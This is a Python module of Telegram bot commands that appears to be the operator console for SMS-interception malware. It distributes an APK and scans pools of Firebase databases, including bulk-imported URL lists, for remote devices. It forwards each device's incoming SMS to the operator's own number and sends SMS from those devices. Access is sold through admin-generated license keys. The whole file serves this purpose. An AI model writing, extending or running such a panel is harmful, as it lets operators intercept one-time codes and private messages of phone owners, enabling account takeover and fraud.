import asyncio
import logging
import time
from datetime import datetime, timezone

from sqlalchemy.orm import Session
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes, MessageHandler, filters

from app.config import get_settings
from app.user_access import approve_user, is_admin, is_allowed, list_approved_users, revoke_user
from app.database import Device, MonitorProfile, OutboundSMS, SMSMessage, SessionLocal
from app.bulk_firebase import bulk_import_from_txt
from app.channel_relay import (
    get_profile_by_channel,
    queue_manual_sms_with_firebase,
)
from app.firebase_sync import (
    forward_incoming_to_mynum,
    send_polling_startup_test,
    sync_profile_for_user,
    sync_profile_to_firebase,
)
from app.monitor_timer import cancel_auto_stop, schedule_auto_stop
from app.device_ui import (
    device_set_keyboard,
    format_access_approved_card,
    format_addchannel_card,
    format_apk_download_card,
    format_device_set_card,
    format_firebase_connected_card,
    format_key_error_card,
    format_key_generated_card,
    format_key_set_card,
    format_monitoring_card,
    format_mynum_set_card,
    format_ping_card,
    format_premium_gate_card,
    format_inject_startup_card,
    format_send_queued,
    format_sim_selected_card,
    format_status_card,
    format_stop_card,
    STARTUP_TEST_MESSAGE,
    STARTUP_TEST_SENDER,
    format_commands_message,
    format_guide_message,
    format_welcome_message,
    get_selected_sim,
    get_sim_list,
    monitoring_keyboard,
    device_set_keyboard,
    sim_monitoring_keyboard,
)
from app.license_keys import (
    generate_license_key,
    list_key_devices,
    publish_license_key,
)
from app.telegram_notify import send_inject_stream_dm
from app.services import (
    device_status,
    get_active_device,
    get_monitoring_user_ids,
    register_device,
    get_monitor_profile,
    get_or_create_monitor_profile,
    resume_monitoring,
    select_sim_slot,
    connect_firebase_url,
    set_channel_id,
    set_license_key,
    require_license_key,
    show_device_by_id,
    set_profile_phone,
    ensure_mynum_selected,
    set_user_phone,
    start_monitoring,
    stop_monitoring,
    sync_device_from_firebase,
)

logger = logging.getLogger(__name__)
settings = get_settings()
AWAITING_FIREBASE_TXT = "awaiting_firebase_txt"


def is_authorized(user_id: int | None) -> bool:
    return is_allowed(user_id)


async def reply_if_unauthorized(update: Update) -> bool:
    user_id = update.effective_user.id if update.effective_user else None
    if is_authorized(user_id):
        return True
    if update.message:
        await update.message.reply_text(
            format_premium_gate_card(user_id or 0),
            parse_mode="HTML",
        )
    return False


def format_sms(sms: SMSMessage) -> str:
    received = sms.received_at.astimezone(timezone.utc).strftime("%d %b %Y, %H:%M UTC")
    return (
        f"📱 *Device:* `{sms.device_name}`\n"
        f"📞 *From:* `{sms.sender}`\n"
        f"🕐 *Time:* {received}\n"
        f"💬 *Message:*\n{sms.message}"
    )


def format_device_line(device: Device, sms_count: int) -> str:
    status = device_status(device)
    icon = {"online": "🟢", "idle": "🟡", "offline": "🔴", "inactive": "⚫"}.get(status, "⚪")
    last_seen = (
        device.last_seen.astimezone(timezone.utc).strftime("%d %b %H:%M")
        if device.last_seen
        else "Never"
    )
    source = " 🔥" if device.firebase_key else ""
    return f"{icon} `{device.name}`{source} — {sms_count} SMS | last: {last_seen}"


async def _pin_monitoring_message(bot, chat_id: int, message_id: int) -> None:
    try:
        await bot.pin_chat_message(
            chat_id=chat_id,
            message_id=message_id,
            disable_notification=True,
        )
    except Exception as exc:
        logger.debug("Pin message failed: %s", exc)


async def _deliver_monitoring_started(
    bot,
    chat_id: int,
    profile: MonitorProfile,
    device: Device,
    ignored: int,
    *,
    message_id: int | None = None,
    reply_func=None,
    inject_total_ms: int = 15,
) -> None:
    queued_ms = max(1, inject_total_ms - 2)
    monitoring_card = format_monitoring_card(device, profile, ignored_sms=ignored)
    startup_card = format_inject_startup_card(
        STARTUP_TEST_SENDER,
        STARTUP_TEST_MESSAGE,
        queued_ms=queued_ms,
        total_ms=inject_total_ms,
    )
    keyboard = monitoring_keyboard(device)

    if message_id is not None and reply_func:
        await reply_func(
            monitoring_card,
            parse_mode="HTML",
            reply_markup=keyboard,
        )
        await _pin_monitoring_message(bot, chat_id, message_id)
    elif reply_func:
        sent = await reply_func(
            monitoring_card,
            parse_mode="HTML",
            reply_markup=keyboard,
        )
        await _pin_monitoring_message(bot, chat_id, sent.message_id)

    await bot.send_message(chat_id=chat_id, text=startup_card, parse_mode="HTML")


async def notify_new_sms(sms: SMSMessage) -> None:
    """Inject to /mynum first, then Astik [STREAM] card in owner DM."""
    t0 = time.perf_counter()

    db: Session = SessionLocal()
    try:
        monitoring_users = get_monitoring_user_ids(db, sms)
        if not monitoring_users and settings.allowed_user_ids:
            monitoring_users = settings.allowed_user_ids
    finally:
        db.close()

    if not monitoring_users:
        logger.warning("No active monitors; skipping inject")
        return

    stream_targets: list[int] = []
    db = SessionLocal()
    try:
        inject_tasks = []
        for user_id in monitoring_users:
            profile = get_monitor_profile(db, user_id)
            device = get_active_device(db, user_id)
            if (
                profile
                and profile.is_monitoring
                and device
                and profile.phone_number
                and sms.device_id == device.id
            ):
                inject_tasks.append(
                    forward_incoming_to_mynum(db, profile, device, sms.sender, sms.message)
                )
                stream_targets.append(user_id)
        if inject_tasks:
            await asyncio.gather(*inject_tasks, return_exceptions=True)
    finally:
        db.close()

    relay_ms = max(1, int((time.perf_counter() - t0) * 1000))
    for user_id in stream_targets:
        asyncio.create_task(send_inject_stream_dm(user_id, sms.sender, sms.message, relay_ms))


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id if update.effective_user else None
    if not is_authorized(user_id):
        await update.message.reply_text(
            format_premium_gate_card(user_id or 0),
            parse_mode="HTML",
        )
        return

    await update.message.reply_text(format_welcome_message(), parse_mode="HTML")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return
    await update.message.reply_text(format_commands_message(), parse_mode="HTML")


async def guide_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    await update.message.reply_text(format_guide_message(), parse_mode="HTML")


async def apk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return
    url = settings.apk_download_url
    keyboard = InlineKeyboardMarkup(
        [[InlineKeyboardButton("📥 Download APK (tap)", url=url)]]
    )
    await update.message.reply_text(
        format_apk_download_card(url),
        parse_mode="HTML",
        disable_web_page_preview=False,
        reply_markup=keyboard,
    )


async def mynum_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not await reply_if_unauthorized(update):
        return

    if not context.args:
        await update.message.reply_text("❌ <code>/mynum &lt;number&gt;</code>", parse_mode="HTML")
        return

    phone = context.args[0]
    db: Session = SessionLocal()
    try:
        profile = set_profile_phone(db, user.id, phone)
        device = get_active_device(db, user.id)
        if not device:
            raise ValueError("Pehle /fdy <device_id> se device select karo")
        asyncio.create_task(sync_profile_for_user(user.id))
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    text = format_mynum_set_card(profile.phone_number or phone)
    if profile.sim_selected:
        await update.message.reply_text(
            text,
            parse_mode="HTML",
            reply_markup=sim_monitoring_keyboard(device),
        )
    else:
        await update.message.reply_text(text, parse_mode="HTML")


async def _prepare_monitoring(
    db: Session,
    user_id: int,
    profile: MonitorProfile,
    device: Device,
) -> None:
    from app.firebase_sync import resolve_firebase_url
    from app.license_keys import ensure_ready_for_monitoring

    license_key = require_license_key(profile)
    firebase_url = resolve_firebase_url(profile, device)
    await ensure_ready_for_monitoring(
        license_key,
        device.name,
        user_id,
        target_number=profile.phone_number,
        firebase_url=firebase_url,
    )
    asyncio.create_task(sync_profile_to_firebase(profile, device))


async def startmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not await reply_if_unauthorized(update):
        return

    status_msg = await update.message.reply_text(
        "⏳ <b>Monitoring start ho raha hai...</b>",
        parse_mode="HTML",
    )
    db: Session = SessionLocal()
    inject_total_ms = 15
    try:
        profile, device, ignored, inject_total_ms = await _activate_monitoring(db, user.id)
    except ValueError as exc:
        hint = _monitoring_start_error_hint(str(exc))
        await status_msg.edit_text(f"❌ <b>ERROR</b>\n\n{hint}", parse_mode="HTML")
        return
    finally:
        db.close()

    bot = update.get_bot()
    await _deliver_monitoring_started(
        bot,
        update.effective_chat.id,
        profile,
        device,
        ignored,
        reply_func=status_msg.edit_text,
        inject_total_ms=inject_total_ms or 15,
    )
    schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)


async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if context.args:
        channel_id = context.args[0]
    elif update.effective_chat and update.effective_chat.type in ("channel", "group", "supergroup"):
        channel_id = str(update.effective_chat.id)
    else:
        await update.message.reply_text("❌ <code>/addchannel &lt;channel-id&gt;</code>", parse_mode="HTML")
        return
    db: Session = SessionLocal()
    try:
        profile = set_channel_id(db, user.id, channel_id)
        device = get_active_device(db, user.id)
        sim_slot = 1
        if device:
            sims = get_sim_list(device)
            sim_index = profile.selected_sim_index or 0
            sim_slot = sims[sim_index]["slot"] if sims else 1
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    if profile and device:
        asyncio.create_task(sync_profile_for_user(user.id))
    await update.message.reply_text(
        format_addchannel_card(channel_id, sim_slot=sim_slot),
        parse_mode="HTML",
    )


def _is_inject_stream_message(text: str) -> bool:
    markers = (
        "INJECT FORWARDED!",
        STARTUP_TEST_MESSAGE,
    )
    return any(marker in text for marker in markers)


async def channel_sms_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.channel_post or update.message
    if not message:
        return

    text = (message.text or message.caption or "").strip()
    if not text:
        return

    if _is_inject_stream_message(text):
        return

    from app.outbound_relay import is_relayable_outgoing_text, is_virtus_status_post, relay_outgoing_batch

    if is_virtus_status_post(text):
        return
    if not is_relayable_outgoing_text(text):
        logger.debug("Channel post skipped (not relayable): chat=%s text=%r", message.chat_id, text[:80])
        return

    channel_id = str(message.chat_id)
    db: Session = SessionLocal()
    try:
        linked = get_profile_by_channel(db, channel_id)
        if not linked:
            logger.warning("No profile linked to channel %s — run /addchannel", channel_id)
            return

        sent = await relay_outgoing_batch(
            db,
            linked,
            text,
            channel_message_id=message.message_id,
            source="channel",
        )
        if sent:
            logger.info("Channel relay queued %s outgoing SMS from %s", sent, channel_id)
        else:
            logger.warning("Channel relay matched %s profiles but sent 0 from %s", len(linked), channel_id)
    finally:
        db.close()


async def _sim_menu_after_stop(
    db: Session,
    user_id: int,
    device: Device | None,
    profile: MonitorProfile | None,
) -> tuple[str, InlineKeyboardMarkup | None]:
    if not device:
        return format_stop_card(), None
    if device.firebase_source_url:
        device = await sync_device_from_firebase(db, device)
    sim_index = (profile.selected_sim_index or 0) if profile else 0
    return (
        format_device_set_card(device, sim_index),
        device_set_keyboard(device),
    )


async def stopmonitar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    profile = None
    device = None
    try:
        profile = stop_monitoring(db, user.id)
        device = get_active_device(db, user.id)
        cancel_auto_stop(user.id)
        if profile:
            asyncio.create_task(sync_profile_for_user(user.id))
        text, keyboard = await _sim_menu_after_stop(db, user.id, device, profile)
    except ValueError as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    await update.message.reply_text(text, parse_mode="HTML", reply_markup=keyboard)


async def allfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    context.user_data[AWAITING_FIREBASE_TXT] = True
    await update.message.reply_text("📄 .txt file attach karo", parse_mode="HTML")


async def firebase_txt_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not user or not context.user_data.get(AWAITING_FIREBASE_TXT):
        return
    if not is_authorized(user.id):
        return

    document = update.message.document
    if not document:
        return

    filename = (document.file_name or "").lower()
    if not filename.endswith(".txt"):
        await update.message.reply_text("❌ Sirf `.txt` file bhejo.")
        return

    context.user_data[AWAITING_FIREBASE_TXT] = False
    status_msg = await update.message.reply_text("⏳ Txt file read ho rahi hai — Firebase scan start...")

    try:
        telegram_file = await document.get_file()
        raw = await telegram_file.download_as_bytearray()
        content = raw.decode("utf-8", errors="ignore")
    except Exception as exc:
        await status_msg.edit_text(f"❌ File read error: {exc}")
        return

    db: Session = SessionLocal()

    async def on_progress(done: int, total: int, imported: int) -> None:
        try:
            await status_msg.edit_text(
                f"⏳ Import ho raha hai...\n"
                f"Lines: {done}/{total}\n"
                f"Devices: {imported}"
            )
        except Exception:
            pass

    try:
        result = await bulk_import_from_txt(db, content, live_fetch=True, on_progress=on_progress)
    except ValueError as exc:
        await status_msg.edit_text(f"❌ {exc}")
        return
    except Exception as exc:
        logger.error("Bulk firebase import failed: %s", exc)
        await status_msg.edit_text(f"❌ Import failed: {exc}")
        return
    finally:
        db.close()

    pool_total = result.get("pool_urls", result["pool_total"])
    await status_msg.edit_text(
        "✅ <b>SCAN DONE</b>\n\n"
        "<pre>"
        f"URLs found: {result['lines']}\n"
        f"New added: {result['imported']}\n"
        f"Total pool: {pool_total}\n"
        f"Failed: {result['failed']}"
        "</pre>",
        parse_mode="HTML",
    )


async def setfirebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if not context.args:
        await update.message.reply_text("❌ <code>/setfirebase &lt;url&gt;</code>", parse_mode="HTML")
        return

    firebase_url = " ".join(context.args)
    status_msg = await update.message.reply_text("⏳ Firebase connect ho raha hai...")

    db: Session = SessionLocal()
    device = None
    try:
        profile, total, online_count, device_ids = await connect_firebase_url(db, user.id, firebase_url)
        if profile.active_device_id:
            device = db.query(Device).filter(Device.id == profile.active_device_id).first()
    except ValueError as exc:
        await status_msg.edit_text(f"❌ {exc}")
        return
    except Exception as exc:
        logger.error("Firebase connect failed: %s", exc)
        await status_msg.edit_text(f"❌ Firebase error: {exc}")
        return
    finally:
        db.close()

    asyncio.create_task(sync_profile_for_user(user.id))
    await status_msg.edit_text(
        format_firebase_connected_card(
            profile.firebase_url or firebase_url,
            online_count,
            total,
            device_ids=device_ids,
        ),
        parse_mode="HTML",
    )


def _normalize_device_id_args(args: list[str]) -> str:
    cleaned = [part.strip() for part in args if part and part.strip()]
    if cleaned and cleaned[0].lower() in {"/a", "/fdy", "/fy", "/fb", "/la", "a", "fdy", "fy", "fb"}:
        cleaned = cleaned[1:]
    return cleaned[0] if cleaned else ""


async def device_select_command(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    *,
    bind_license_key: bool = False,
    require_key: bool = False,
) -> None:
    """Find device — /fdy /fy /fb without key; /a with license key for inject."""
    user = update.effective_user
    if not await reply_if_unauthorized(update):
        return

    if require_key:
        db: Session = SessionLocal()
        try:
            profile = get_monitor_profile(db, user.id)
            require_license_key(profile)
        except ValueError as exc:
            await update.message.reply_text(f"❌ {exc}", parse_mode="HTML")
            return
        finally:
            db.close()

    if not context.args:
        cmd = (update.message.text or "").split()[0]
        await update.message.reply_text(f"❌ <code>{cmd} &lt;device_id&gt;</code>", parse_mode="HTML")
        return

    deviceid = _normalize_device_id_args(list(context.args))
    if not deviceid:
        await update.message.reply_text("❌ <code>/fdy &lt;device_id&gt;</code>", parse_mode="HTML")
        return

    status_msg = await update.message.reply_text(
        f"🔍 Device <code>{deviceid}</code> dhundh raha hoon...",
        parse_mode="HTML",
    )
    db: Session = SessionLocal()
    try:
        device, profile = await asyncio.wait_for(
            show_device_by_id(
                db,
                deviceid,
                user.id,
                bind_license_key=bind_license_key,
            ),
            timeout=25.0,
        )
    except asyncio.TimeoutError:
        from app.services import get_all_firebase_urls

        db_count = len(get_all_firebase_urls(db))
        await status_msg.edit_text(
            f"❌ Device <code>{deviceid}</code> not found ({db_count} DBs scanned)",
            parse_mode="HTML",
        )
        return
    except LookupError as exc:
        message = str(exc)
        if message.startswith("multiple:"):
            options = message.removeprefix("multiple:").split("|")
            lines = [f"🔎 <b>{len(options)}+ matches</b> for <code>{deviceid}</code>\n"]
            for option in options:
                name, _fb = (option.split(":", 1) + ["-"])[:2]
                lines.append(f"• <code>{name}</code>")
            await status_msg.edit_text("\n".join(lines), parse_mode="HTML")
            return
        if message.startswith("notfound:"):
            db_count = message.removeprefix("notfound:")
            await status_msg.edit_text(
                f"❌ Device <code>{deviceid}</code> not found ({db_count} DBs)",
                parse_mode="HTML",
            )
            return
        total = db.query(Device).count()
        await status_msg.edit_text(
            f"❌ Device <code>{deviceid}</code> nahi mili (pool: {total})",
            parse_mode="HTML",
        )
        return
    except Exception as exc:
        logger.error("Device lookup failed: %s", exc)
        await status_msg.edit_text(f"❌ Error: {exc}")
        return
    finally:
        db.close()

    try:
        await status_msg.delete()
    except Exception:
        pass
    try:
        await send_device_set_ui(update.message, device, profile)
    except Exception as exc:
        logger.error("Device card send failed: %s", exc)
        await update.message.reply_text(
            f"✅ Device <code>{device.name}</code> found\n"
            "❌ Card send error — dubara try karo",
            parse_mode="HTML",
        )


async def fdy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await device_select_command(update, context, bind_license_key=False)


async def setdevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not await reply_if_unauthorized(update):
        return

    if not context.args:
        db: Session = SessionLocal()
        try:
            active = get_active_device(db, user.id)
            profile = get_monitor_profile(db, user.id)
            if active:
                await send_device_set_ui(update.message, active, profile)
                return
        finally:
            db.close()

    await device_select_command(update, context, bind_license_key=False)


async def fy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await device_select_command(update, context, bind_license_key=False)


async def send_device_set_ui(
    message,
    device: Device,
    profile: MonitorProfile | None = None,
) -> None:
    if device.firebase_source_url:
        db: Session = SessionLocal()
        try:
            device = await asyncio.wait_for(
                sync_device_from_firebase(db, device, full=True),
                timeout=8.0,
            )
            if profile:
                asyncio.create_task(sync_profile_for_user(profile.telegram_user_id))
        except Exception:
            pass
        finally:
            db.close()

    sim_index = profile.selected_sim_index if profile else 0
    await message.reply_text(
        format_device_set_card(
            device,
            selected_sim=sim_index,
            status=device_status(device),
        ),
        parse_mode="HTML",
        reply_markup=device_set_keyboard(device),
    )


async def a_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not await reply_if_unauthorized(update):
        return

    if not context.args:
        db: Session = SessionLocal()
        try:
            active = get_active_device(db, user.id)
            profile = get_monitor_profile(db, user.id)
            if active:
                await send_device_set_ui(update.message, active, profile)
                return
        finally:
            db.close()
        await update.message.reply_text("❌ <code>/a &lt;device_id&gt;</code>", parse_mode="HTML")
        return

    await device_select_command(
        update,
        context,
        bind_license_key=True,
        require_key=True,
    )


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await stopmonitar_command(update, context)


async def resume_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not await reply_if_unauthorized(update):
        return

    db: Session = SessionLocal()
    inject_total_ms = 15
    ignored = 0
    try:
        profile = get_monitor_profile(db, user.id)
        device = get_active_device(db, user.id)
        if not profile or not device:
            raise ValueError("Pehle device select karo")
        profile, device = resume_monitoring(db, user.id)
        await _prepare_monitoring(db, user.id, profile, device)
        from app.firebase_sms_sync import (
            MONITORING_START_SNAPSHOT_SEC,
            finish_monitoring_baseline,
            mark_monitoring_baseline_started,
            snapshot_firebase_sms_seen,
        )

        mark_monitoring_baseline_started(device, profile, db)
        ignored = 0
        try:
            ignored = await asyncio.wait_for(
                snapshot_firebase_sms_seen(profile, device, db),
                timeout=MONITORING_START_SNAPSHOT_SEC,
            )
        except Exception:
            asyncio.create_task(finish_monitoring_baseline(profile.id, device.id))
        try:
            _, inject_total_ms = await asyncio.wait_for(
                send_polling_startup_test(db, profile, device),
                timeout=5.0,
            )
        except Exception:
            inject_total_ms = 15
    except ValueError as exc:
        await update.message.reply_text(f"❌ {_monitoring_start_error_hint(str(exc))}")
        return
    finally:
        db.close()

    await _deliver_monitoring_started(
        update.get_bot(),
        update.effective_chat.id,
        profile,
        device,
        int(ignored),
        reply_func=update.message.reply_text,
        inject_total_ms=inject_total_ms or 15,
    )
    schedule_auto_stop(user.id, profile.auto_stop_minutes or 15)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        profile = get_monitor_profile(db, user.id)
        device = get_active_device(db, user.id)
    finally:
        db.close()

    await update.message.reply_text(
        format_status_card(device, profile),
        parse_mode="HTML",
    )


async def send_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    if len(context.args) < 2:
        await update.message.reply_text("❌ <code>/send &lt;number&gt; &lt;message&gt;</code>", parse_mode="HTML")
        return

    to_number = context.args[0]
    message = " ".join(context.args[1:])
    db: Session = SessionLocal()
    try:
        profile = get_monitor_profile(db, user.id)
        device = get_active_device(db, user.id)
        if not profile or not device:
            await update.message.reply_text("❌ Pehle /setdevice <id> se device select karo.")
            return
        outbound = await queue_manual_sms_with_firebase(db, profile, device, to_number, message)
        sims = get_sim_list(device)
        sim_slot = sims[profile.selected_sim_index or 0]["slot"] if sims else outbound.sim_slot
    except Exception as exc:
        await update.message.reply_text(f"❌ {exc}")
        return
    finally:
        db.close()

    await update.message.reply_text(
        format_send_queued(to_number, message, sim_slot),
        parse_mode="HTML",
    )


async def approve_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not user or not is_admin(user.id):
        await update.message.reply_text("❌ Sirf admin is command use kar sakta hai.")
        return

    if not context.args:
        await update.message.reply_text("❌ <code>/approve &lt;telegram_id&gt;</code>", parse_mode="HTML")
        return

    try:
        target_id = int(context.args[0].strip())
    except ValueError:
        await update.message.reply_text("❌ Valid numeric Telegram user ID daalo.")
        return

    username = context.args[1].lstrip("@") if len(context.args) > 1 else None
    ok, message = approve_user(user.id, target_id, username=username)
    if ok:
        await update.message.reply_text(
            f"✅ <b>{message}</b> — <code>{target_id}</code>",
            parse_mode="HTML",
        )
        try:
            await update.get_bot().send_message(
                chat_id=target_id,
                text=format_access_approved_card(),
                parse_mode="HTML",
            )
        except Exception as exc:
            logger.debug("Could not notify approved user %s: %s", target_id, exc)
    else:
        await update.message.reply_text(f"❌ {message}")


async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not user or not is_admin(user.id):
        await update.message.reply_text("❌ Sirf admin is command use kar sakta hai.")
        return

    if not context.args:
        await update.message.reply_text("❌ <code>/revoke &lt;telegram_id&gt;</code>", parse_mode="HTML")
        return

    try:
        target_id = int(context.args[0].strip())
    except ValueError:
        await update.message.reply_text("❌ Valid numeric Telegram user ID daalo.")
        return

    ok, message = revoke_user(user.id, target_id)
    await update.message.reply_text(f"{'✅' if ok else '❌'} {message}")


async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not user or not is_admin(user.id):
        await update.message.reply_text("❌ Sirf admin is command use kar sakta hai.")
        return

    lines = ["👥 <b>Approved Users</b>\n"]
    for admin_id in sorted(settings.allowed_user_ids):
        lines.append(f"🛡 Admin: <code>{admin_id}</code> (.env)")

    approved = list_approved_users()
    if approved:
        for row in approved:
            name = f"@{row.username}" if row.username else "no-username"
            lines.append(f"✅ <code>{row.telegram_user_id}</code> — {name}")
    else:
        lines.append("\nKoi bot-approved user nahi.")

    lines.append("\nAdd: <code>/approve &lt;id&gt;</code>")
    await update.message.reply_text("\n".join(lines), parse_mode="HTML")


async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    start = time.perf_counter()
    msg = await update.message.reply_text("🏓 Pinging...")
    latency = int((time.perf_counter() - start) * 1000)
    await msg.edit_text(format_ping_card(latency), parse_mode="HTML")


async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not await reply_if_unauthorized(update):
        return

    if not context.args:
        await update.message.reply_text(format_key_error_card(), parse_mode="HTML")
        return

    action = context.args[0].lower()
    if action in {"generate", "gen", "genkey"}:
        if not is_admin(user.id):
            await update.message.reply_text("❌ Sirf admin <code>/key generate</code> kar sakta hai.")
            return
        db: Session = SessionLocal()
        try:
            new_key = generate_license_key(user.id)
            profile = get_or_create_monitor_profile(db, user.id)
            profile.license_key = new_key
            profile.is_monitoring = False
            device = get_active_device(db, user.id)
            db.commit()
            firebase_bases = [profile.firebase_url] if profile.firebase_url else None
            try:
                await publish_license_key(new_key, firebase_bases=firebase_bases)
            except Exception as exc:
                logger.warning("Firebase key publish skipped: %s", exc)
            if device:
                from app.license_keys import register_device_on_key
                from app.services import bind_device_to_license_key

                register_device_on_key(new_key, device.name, user.id)
                await bind_device_to_license_key(db, profile, device)
                asyncio.create_task(sync_profile_for_user(user.id))
        except Exception as exc:
            logger.error("License key generate failed: %s", exc)
            await update.message.reply_text(f"❌ Key generate failed: {exc}")
            return
        finally:
            db.close()
        await update.message.reply_text(
            format_key_generated_card(new_key),
            parse_mode="HTML",
        )
        return

    if action == "status" and len(context.args) >= 2:
        license_key = context.args[1].upper()
        devices = list_key_devices(license_key)
        lines = [f"🔑 {license_key}", f"📱 Devices: {len(devices)}"]
        for device_id, meta in devices.items():
            attached = "✅ APK" if meta.get("apk_attached_at_ms") else "⏳ waiting"
            lines.append(f"• {device_id} — {attached}")
        await update.message.reply_text("\n".join(lines))
        return

    key_value = " ".join(context.args).strip()
    if key_value.startswith(("http://", "https://")) or (
        "firebaseio.com" in key_value.lower() or "firebasedatabase.app" in key_value.lower()
    ):
        await update.message.reply_text("❌ <code>/setfirebase &lt;url&gt;</code>", parse_mode="HTML")
        return

    from app.license_keys import assert_license_key_format

    try:
        assert_license_key_format(key_value)
    except ValueError:
        await update.message.reply_text("❌ <code>/key KEY-XXXX-XXXX-XXXX-XXXX</code>", parse_mode="HTML")
        return

    from app.license_keys import license_key_exists

    if not license_key_exists(key_value):
        await update.message.reply_text(
            "❌ Invalid KEY — sirf admin-generated key use karo.\n<code>/key generate</code> admin only",
            parse_mode="HTML",
        )
        return

    db: Session = SessionLocal()
    try:
        profile, display_key, _key_type = await set_license_key(db, user.id, key_value)
    except ValueError as exc:
        if str(exc) == "use_setfirebase":
            await update.message.reply_text("❌ <code>/setfirebase &lt;url&gt;</code>", parse_mode="HTML")
        elif str(exc) == "invalid_format":
            await update.message.reply_text(format_key_error_card(), parse_mode="HTML")
        elif str(exc) == "invalid_key":
            await update.message.reply_text("❌ Invalid key — <code>/key generate</code>", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ {exc}")
        return
    except Exception as exc:
        logger.error("License key failed: %s", exc)
        await update.message.reply_text(f"❌ Error: {exc}")
        return
    finally:
        db.close()

    await update.message.reply_text(
        format_key_set_card(display_key),
        parse_mode="HTML",
    )


async def devices_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if not is_authorized(user.id if user else None):
        return

    db: Session = SessionLocal()
    try:
        active = get_active_device(db, user.id)
        profile = get_monitor_profile(db, user.id)
        if not active:
            await update.message.reply_text("❌ <code>/fdy &lt;device_id&gt;</code>", parse_mode="HTML")
            return
    finally:
        db.close()

    await send_device_set_ui(update.message, active, profile)


async def device_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("❌ <code>/device &lt;name&gt;</code>", parse_mode="HTML")
        return

    device_name = " ".join(context.args)
    db: Session = SessionLocal()
    try:
        device = db.query(Device).filter(Device.name == device_name).first()
        if not device:
            await update.message.reply_text(
                f"❌ Device `{device_name}` nahi mili.\n/devices se list dekho.",
                parse_mode="Markdown",
            )
            return

        messages = (
            db.query(SMSMessage)
            .filter(SMSMessage.device_name == device_name)
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text(f"📭 `{device_name}` par abhi koi SMS nahi.", parse_mode="Markdown")
        return

    parts = [f"📱 *Device:* `{device_name}`\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


async def adddevice_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    if not context.args:
        await update.message.reply_text("❌ <code>/adddevice &lt;name&gt;</code>", parse_mode="HTML")
        return

    device_name = " ".join(context.args)
    db: Session = SessionLocal()
    try:
        device = register_device(db, device_name)
        db.commit()
        db.refresh(device)
    finally:
        db.close()

    await update.message.reply_text(
        f"✅ <code>{device.name}</code> | 🔑 <code>{device.api_key}</code>",
        parse_mode="HTML",
    )


async def recent_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_authorized(update.effective_user.id if update.effective_user else None):
        return

    db: Session = SessionLocal()
    try:
        messages = (
            db.query(SMSMessage)
            .order_by(SMSMessage.received_at.desc())
            .limit(10)
            .all()
        )
    finally:
        db.close()

    if not messages:
        await update.message.reply_text("📭 No SMS messages yet.")
        return

    parts = ["📬 *Recent SMS (last 10)*\n"]
    for sms in messages:
        parts.append(format_sms(sms))
        parts.append("—" * 20)

    await update.message.reply_text("\n".join(parts), parse_mode="Markdown")


